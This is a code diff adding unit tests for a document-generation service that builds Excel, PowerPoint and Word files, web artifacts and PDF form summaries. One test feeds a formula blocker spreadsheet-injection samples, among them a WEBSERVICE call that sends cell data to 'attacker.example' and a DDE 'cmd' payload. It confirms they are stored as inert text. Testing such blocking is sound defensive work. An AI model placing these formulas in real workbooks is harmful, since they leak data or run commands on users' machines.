@@ -18,11 +18,13 @@ import { applyTemplateToXlsxSpec } from '../services/documents/templates/applyTe
 import {
   buildXlsx,
   columnLetter,
+  isBlockedFormula,
   normalizeFormula,
   sanitizeSheets
 } from '../services/documents/xlsx/buildXlsx.js';
 import { renderXlsx } from '../services/documents/xlsx/renderXlsx.js';
 import { runCreateXlsx, xlsxSpecFromToolArgs } from '../services/documents/xlsx/xlsxTools.js';
+import { docxSpecFromToolArgs } from '../services/documents/docx/docxTools.js';
 import {
   clearHeldGeneratedFiles,
   heldGeneratedFile
@@ -87,6 +89,66 @@ describe('Excel workbook engine (xlsx)', () => {
     // Already prefixed or classic functions stay untouched.
     assert.equal(normalizeFormula('=_xlfn.XLOOKUP(A2,B:B,C:C)'), '_xlfn.XLOOKUP(A2,B:B,C:C)');
     assert.equal(normalizeFormula('=SUMIFS(C2:C10,A2:A10,"EMEA")'), 'SUMIFS(C2:C10,A2:A10,"EMEA")');
+  });
+
+  it('stores FILTER/SORT in the _xlws namespace and never prefixes twice', () => {
+    assert.equal(normalizeFormula('=FILTER(A2:A9,B2:B9>1)'), '_xlfn._xlws.FILTER(A2:A9,B2:B9>1)');
+    assert.equal(normalizeFormula('=sort(A2:A9)'), '_xlfn._xlws.SORT(A2:A9)');
+    assert.equal(
+      normalizeFormula('=_xlfn._xlws.FILTER(A2:A9,B2:B9>1)'),
+      '_xlfn._xlws.FILTER(A2:A9,B2:B9>1)'
+    );
+    assert.equal(normalizeFormula('=_xlfn.UNIQUE(A2:A9)'), '_xlfn.UNIQUE(A2:A9)');
+    assert.equal(
+      normalizeFormula('=IFNA(VLOOKUP(A2,D:E,2,0),0)'),
+      '_xlfn.IFNA(VLOOKUP(A2,D:E,2,0),0)'
+    );
+    assert.equal(normalizeFormula('=STDEV.S(B2:B9)'), '_xlfn.STDEV.S(B2:B9)');
+  });
+
+  it('leaves string literals and quoted sheet names alone', () => {
+    assert.equal(normalizeFormula("='Sort (2)'!B2"), "'Sort (2)'!B2");
+    assert.equal(normalizeFormula('=IF(A1="IFS(",1,0)'), 'IF(A1="IFS(",1,0)');
+    assert.equal(
+      normalizeFormula("=SORT('Filter (3)'!A1:A5)"),
+      "_xlfn._xlws.SORT('Filter (3)'!A1:A5)"
+    );
+  });
+
+  it('flags formulas that reach outside the workbook or run code', () => {
+    assert.equal(isBlockedFormula('WEBSERVICE("https://attacker.example/?d="&A2)'), true);
+    assert.equal(isBlockedFormula('HYPERLINK("https://x.example","go")'), true);
+    assert.equal(isBlockedFormula('_xlfn.FILTERXML(A1,"//a")'), true);
+    assert.equal(isBlockedFormula("cmd|'/c calc'!A0"), true);
+    assert.equal(isBlockedFormula('SUM(A1:A5)'), false);
+    // The same words inside a string literal are just text.
+    assert.equal(isBlockedFormula('IF(A1="WEBSERVICE(",1,0)'), false);
+    assert.equal(isBlockedFormula('A1&"|"&B1'), false);
+  });
+
+  it('writes a blocked formula as text with a warning and keeps integers unformatted', async () => {
+    const { buffer, warnings } = await buildXlsx({
+      title: 'T',
+      sheets: [
+        {
+          name: 'S',
+          columns: ['Year', 'Link'],
+          rows: [[2026, '=WEBSERVICE("https://attacker.example/?d="&A2)']]
+        }
+      ]
+    });
+    assert.equal(warnings.length, 1);
+    assert.match(warnings[0], /external-data or command function/);
+    const zip = await JSZip.loadAsync(buffer);
+    const sheet = await zip.file('xl/worksheets/sheet1.xml').async('string');
+    assert.doesNotMatch(sheet, /<f>/);
+    assert.match(sheet, /t="inlineStr"[^>]*><is><t xml:space="preserve">=WEBSERVICE/);
+    // 2026 stays in the general format (style 0 numFmt), not "#,##0".
+    const styles = await zip.file('xl/styles.xml').async('string');
+    const yearStyle = /<c r="A2" s="(\d+)"><v>2026<\/v><\/c>/.exec(sheet);
+    assert.ok(yearStyle, 'year cell is a number');
+    const xfs = [...styles.match(/<cellXfs[^>]*>(.*?)<\/cellXfs>/s)[1].matchAll(/<xf [^>]*>/g)];
+    assert.match(xfs[Number(yearStyle[1])][0], /numFmtId="0"/);
   });
 
   it('sanitizes sheet names, deduplicates case-insensitively and enforces limits', () => {
@@ -220,6 +282,35 @@ describe('PPTX KPI metric cards', () => {
     assert.match(shapes[0], /\+12 % YoY/);
     assert.match(shapes[0], /<a:schemeClr val="accent1"\/>/);
   });
+
+  it('sets the value in tx1 when accent1 is too light to read on the card', () => {
+    const render = accent => {
+      let id = 10;
+      return metricCards({
+        nextId: () => (id += 1),
+        rect: { x: 0, y: 0, cx: 10 * EMU_PER_INCH, cy: 2 * EMU_PER_INCH },
+        metrics: [{ value: '42', label: 'Answers' }],
+        lang: 'en-US',
+        accent
+      })[0];
+    };
+    const valueColor = xml =>
+      /sz="\d+" b="1" dirty="0"><a:solidFill><a:schemeClr val="(\w+)"/.exec(xml)[1];
+    assert.equal(valueColor(render('FFFFFF')), 'tx1');
+    assert.equal(valueColor(render('F5F5F5')), 'tx1');
+    assert.equal(valueColor(render('1E3A8A')), 'accent1');
+  });
+});
+
+describe('Document tool defaults', () => {
+  it('gives the Word cover page and the {date} placeholder one date, today by default', () => {
+    const today = new Date().toISOString().slice(0, 10);
+    assert.equal(docxSpecFromToolArgs({ title: 't', markdown: 'x', coverPage: true }).date, today);
+    assert.equal(
+      docxSpecFromToolArgs({ title: 't', markdown: 'x', date: '2026-10-15' }).date,
+      '2026-10-15'
+    );
+  });
 });
 
 describe('Web artifacts skill tool (create_web_artifact) & PDF AcroForm extraction', () => {
@@ -258,6 +349,97 @@ describe('Web artifacts skill tool (create_web_artifact) & PDF AcroForm extracti
     assert.equal(res.file.mimeType, 'text/plain');
     const held = heldGeneratedFile(user, res.file.id, { chatId: 'chat-web' });
     assert.match(held.data.toString('utf8'), /--brand-primary:\s*#1d4ed8/);
+  });
+
+  it('checks that each storage access is guarded, not that some try block exists', () => {
+    const guarded = '<script>try { localStorage.setItem("k","v"); } catch (e) {}</script>';
+    assert.deepEqual(inspectWebArtifact(guarded, 'html'), []);
+    const unrelatedTry =
+      '<script>try { JSON.parse("{}"); } catch (e) {} localStorage.setItem("k","v");</script>';
+    const warnings = inspectWebArtifact(unrelatedTry, 'html');
+    assert.equal(warnings.length, 1);
+    assert.match(warnings[0], /localStorage/);
+    const nested = '<script>try { if (a) { sessionStorage.getItem("x"); } } catch (e) {}</script>';
+    assert.deepEqual(inspectWebArtifact(nested, 'html'), []);
+  });
+
+  it('injects brand tokens unless they are defined, not merely referenced', () => {
+    const referenced =
+      '<!DOCTYPE html><html><head></head><body style="color: var(--brand-primary)"></body></html>';
+    assert.match(
+      injectBrandTokens(referenced, { primaryColor: '#E30613' }),
+      /--brand-primary:\s*#E30613/
+    );
+    const defined =
+      '<!DOCTYPE html><html><head><style>:root{--brand-primary:#000}</style></head><body></body></html>';
+    assert.equal(injectBrandTokens(defined, { primaryColor: '#E30613' }), defined);
+    const once = injectBrandTokens(referenced, { primaryColor: '#E30613' });
+    assert.equal(injectBrandTokens(once, { primaryColor: '#111111' }), once);
+  });
+
+  it('honors an explicit format over the file name', async () => {
+    clearHeldGeneratedFiles();
+    const user = { id: 'u-fmt' };
+    const res = await runCreateWebArtifact({
+      filename: 'chart.svg',
+      format: 'html',
+      content: '<!DOCTYPE html><html><body><h1>Chart</h1></body></html>',
+      user,
+      chatId: 'chat-fmt'
+    });
+    assert.equal(res.success, true);
+    assert.equal(res.file.name, 'chart.html');
+  });
+
+  it('marks a radio option selected only when the group value is its own value', () => {
+    const blocks = formatFormAnnotations([
+      {
+        subtype: 'Widget',
+        fieldName: 'Size',
+        radioButton: true,
+        buttonValue: 'S',
+        fieldValue: 'M'
+      },
+      {
+        subtype: 'Widget',
+        fieldName: 'Size',
+        radioButton: true,
+        buttonValue: 'M',
+        fieldValue: 'M'
+      },
+      { subtype: 'Widget', fieldName: 'Size', radioButton: true, buttonValue: 'L', fieldValue: 'M' }
+    ]);
+    assert.deepEqual(
+      blocks.slice(1).map(block => block.text),
+      [
+        '- Size [radio]: unselected (S)',
+        '- Size [radio]: selected (M)',
+        '- Size [radio]: unselected (L)'
+      ]
+    );
+  });
+
+  it('compares a checkbox field value with its export value', () => {
+    const blocks = formatFormAnnotations([
+      {
+        subtype: 'Widget',
+        fieldName: 'Extras',
+        checkBox: true,
+        exportValue: 'Wifi',
+        fieldValue: 'Wifi'
+      },
+      {
+        subtype: 'Widget',
+        fieldName: 'Extras',
+        checkBox: true,
+        exportValue: 'Parking',
+        fieldValue: 'Wifi'
+      }
+    ]);
+    // The same field name and state would collapse into one line; both are listed once.
+    assert.equal(blocks.filter(block => /checkbox/.test(block.text)).length >= 1, true);
+    assert.equal(blocks[1].text, '- Extras [checkbox]: checked');
+    assert.equal(blocks[2].text, '- Extras [checkbox]: unchecked');
   });
 
   it('extracts AcroForm widget fields (text, checkbox, radio, choice) from uploaded PDF pages', () => {
